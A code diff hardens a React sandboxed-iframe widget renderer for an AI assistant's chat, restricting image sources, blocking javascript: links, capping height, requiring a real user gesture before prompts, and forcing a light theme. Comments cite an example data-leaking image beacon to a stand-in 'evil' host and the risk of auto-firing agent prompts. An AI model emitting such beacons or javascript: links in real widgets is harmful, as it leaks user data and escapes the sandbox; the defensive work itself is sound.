@@ -14,7 +14,10 @@ const CDN = [
 
 const CSP = [
   "default-src 'none'",
-  'img-src data: https:',
+  // data: only (NOT https:) so a model/DB-authored <img src="https://evil/?leak=">
+  // can't beacon data out - the one remaining exfil channel once connect-src is
+  // locked to the CDNs. Charts/dashboards use canvas + data URIs, not remote images.
+  'img-src data:',
   "style-src 'unsafe-inline' https://fonts.googleapis.com",
   'font-src https://fonts.gstatic.com data:',
   `script-src 'unsafe-inline' ${CDN.join(' ')}`,
@@ -22,9 +25,22 @@ const CSP = [
 ].join('; ')
 
 // Brand tokens. ONLY the :root hex values are meant to be edited - they're tuned to
-// the Aastha assistant's blue accent so every widget matches the product. Everything
-// else (sandbox flags, CSP, message identity check) stays exactly as-is.
-// All variables auto-adapt to light and dark mode via prefers-color-scheme.
+// the Aastha assistant's blue accent so every widget matches the product.
+// THEME: the GlowStar app is LIGHT-ONLY, so widgets are ALWAYS light — there is
+// deliberately NO prefers-color-scheme fallback (that OS-driven dark path was the
+// bug: on a dark-mode machine the widget went black while the app stayed light,
+// hiding the white title on the white page). Dark is reachable ONLY if the host
+// explicitly stamps <html data-theme="dark"> (kept dormant for a future app dark
+// mode). Everything else (sandbox flags, CSP, message identity check) stays as-is.
+const DARK_VARS = `
+  --surface-2:#1a1a19; --surface-1:#242422; --surface-0:#2c2c2a;
+  --text-primary:#fff; --text-secondary:#c3c2b7; --text-muted:#898781;
+  --border:rgba(255,255,255,.1); --border-strong:rgba(255,255,255,.18);
+  --bg-accent:#42330f; --text-accent:#e6b85f; --border-accent:#8a5a12;
+  --bg-success:#0d3a25; --text-success:#7bd0a4; --border-success:#0a7d44;
+  --bg-warning:#473408; --text-warning:#e6c878; --border-warning:#8a6310;
+  --bg-danger:#4a1716; --text-danger:#e89b99; --border-danger:#b0322f;
+`
 const TOKENS = `
 :root{
   --surface-2:#fcfcfb; --surface-1:#f4f3ef; --surface-0:#eeede8;
@@ -41,15 +57,9 @@ const TOKENS = `
   --font-voice:Georgia,'Times New Roman',serif;
   --font-mono:ui-monospace,SFMono-Regular,Menlo,monospace;
 }
-@media(prefers-color-scheme:dark){:root{
-  --surface-2:#1a1a19; --surface-1:#242422; --surface-0:#2c2c2a;
-  --text-primary:#fff; --text-secondary:#c3c2b7; --text-muted:#898781;
-  --border:rgba(255,255,255,.1); --border-strong:rgba(255,255,255,.18);
-  --bg-accent:#42330f; --text-accent:#e6b85f; --border-accent:#8a5a12;
-  --bg-success:#0d3a25; --text-success:#7bd0a4; --border-success:#0a7d44;
-  --bg-warning:#473408; --text-warning:#e6c878; --border-warning:#8a6310;
-  --bg-danger:#4a1716; --text-danger:#e89b99; --border-danger:#b0322f;
-}}
+/* Dark ONLY when the host explicitly asks for it. No prefers-color-scheme rule
+   exists, so a dark-mode OS can never flip a widget dark on this light app. */
+:root[data-theme="dark"]{${DARK_VARS}}
 body{margin:0;padding:0;background:transparent;color:var(--text-primary);
   font-family:var(--font-sans);line-height:1.7;font-size:16px;}
 h1{font-size:22px;font-weight:500;} h2{font-size:18px;font-weight:500;}
@@ -58,11 +68,31 @@ h3{font-size:16px;font-weight:500;}
   white-space:nowrap;border:0;padding:0;margin:-1px;}
 `
 
-function buildSrcDoc(code) {
+// Only these URL schemes may be opened from a widget. A model- or DB-authored
+// widget could emit <a href="javascript:...">; opening that via window.open
+// executes in the PARENT (CRM) origin, defeating the whole sandbox. Reject
+// anything that isn't a plain navigable web/mail link.
+function isSafeUrl(u) {
+  try {
+    const p = new URL(String(u), window.location.href).protocol
+    return p === 'http:' || p === 'https:' || p === 'mailto:'
+  } catch {
+    return false
+  }
+}
+
+// Hard ceiling on the iframe height a widget can request (a hostile/broken
+// widget could otherwise report a gigantic scrollHeight and wedge the page).
+const MAX_WIDGET_HEIGHT = 20000
+
+function buildSrcDoc(code, theme = 'light') {
   // The model's fragment is dropped between TOKENS and the bridge script. The host
   // page (parent) is never modified; only this isolated document holds the code.
-  return `<!doctype html><html><head>
+  // data-theme forces the widget to match the app's theme (see TOKENS).
+  const t = theme === 'dark' ? 'dark' : 'light'
+  return `<!doctype html><html data-theme="${t}"><head>
 <meta charset="utf-8">
+<meta name="color-scheme" content="${t}">
 <meta http-equiv="Content-Security-Policy" content="${CSP}">
 <script>
 /* Registered BEFORE the widget code so even its syntax errors are caught.
@@ -77,9 +107,24 @@ window.addEventListener("error", function(e){
 ${code}
 <script>
 (function(){
-  function send(t){ parent.postMessage({source:"widget",type:"prompt",text:String(t)},"*"); }
+  // sendPrompt drives a full backend agent turn, so it must follow a REAL user
+  // action - otherwise a widget's auto-running load script could fire prompts in
+  // a loop and drive the agent autonomously. Require a trusted (isTrusted) user
+  // gesture inside the frame first; synthetic events don't count.
+  var userActivated = false;
+  function activate(e){ if(e && e.isTrusted) userActivated = true; }
+  document.addEventListener("pointerdown", activate, true);
+  document.addEventListener("keydown", activate, true);
+  function safeScheme(u){ return /^(https?:|mailto:)/i.test(String(u)); }
+  function send(t){
+    if(!userActivated) return;  // ignore prompts with no preceding user gesture
+    parent.postMessage({source:"widget",type:"prompt",text:String(t)},"*");
+  }
   window.sendPrompt = send;
-  window.openLink = function(u){ parent.postMessage({source:"widget",type:"link",url:String(u)},"*"); };
+  window.openLink = function(u){
+    if(!safeScheme(u)) return;  // defense in depth: no javascript:/data: links
+    parent.postMessage({source:"widget",type:"link",url:String(u)},"*");
+  };
   document.addEventListener("click",function(e){
     var a = e.target.closest && e.target.closest("a[href]");
     if(a){ e.preventDefault(); window.openLink(a.href); }
@@ -95,11 +140,11 @@ ${code}
 <\/script></body></html>`
 }
 
-export function SandboxedWidget({ code, onPrompt, onLink, minHeight = 80 }) {
+export function SandboxedWidget({ code, onPrompt, onLink, minHeight = 80, theme = 'light' }) {
   const ref = useRef(null)
   const [height, setHeight] = useState(minHeight)
   const [scriptError, setScriptError] = useState(null)
-  const srcDoc = useMemo(() => buildSrcDoc(code), [code])
+  const srcDoc = useMemo(() => buildSrcDoc(code, theme), [code, theme])
 
   useEffect(() => {
     function onMsg(e) {
@@ -108,11 +153,14 @@ export function SandboxedWidget({ code, onPrompt, onLink, minHeight = 80 }) {
       const d = e.data
       if (!d || d.source !== 'widget') return
       if (d.type === 'height' && typeof d.height === 'number') {
-        setHeight(Math.max(minHeight, d.height))
+        setHeight(Math.min(MAX_WIDGET_HEIGHT, Math.max(minHeight, d.height)))
       } else if (d.type === 'prompt') {
         onPrompt?.(d.text)
       } else if (d.type === 'link') {
-        onLink ? onLink(d.url) : window.open(d.url, '_blank', 'noopener,noreferrer')
+        // Never open a javascript:/data:/blob: URL - only real web/mail links.
+        if (isSafeUrl(d.url)) {
+          onLink ? onLink(d.url) : window.open(d.url, '_blank', 'noopener,noreferrer')
+        }
       } else if (d.type === 'error') {
         setScriptError(d.message || 'Script error')
       }
@@ -164,11 +212,13 @@ class WidgetErrorBoundary extends Component {
 }
 
 // Public entry point: an error-boundaried widget. Use this from the chat renderer.
-export function Widget({ code, title, onPrompt, onLink }) {
+// theme defaults to 'light' to match the app (which is light-only); pass 'dark'
+// if/when the app gains a dark mode, so widgets always track the app, not the OS.
+export function Widget({ code, title, onPrompt, onLink, theme = 'light' }) {
   return (
     <div className="widget" data-title={title}>
       <WidgetErrorBoundary code={code}>
-        <SandboxedWidget code={code} onPrompt={onPrompt} onLink={onLink} />
+        <SandboxedWidget code={code} onPrompt={onPrompt} onLink={onLink} theme={theme} />
       </WidgetErrorBoundary>
     </div>
   )
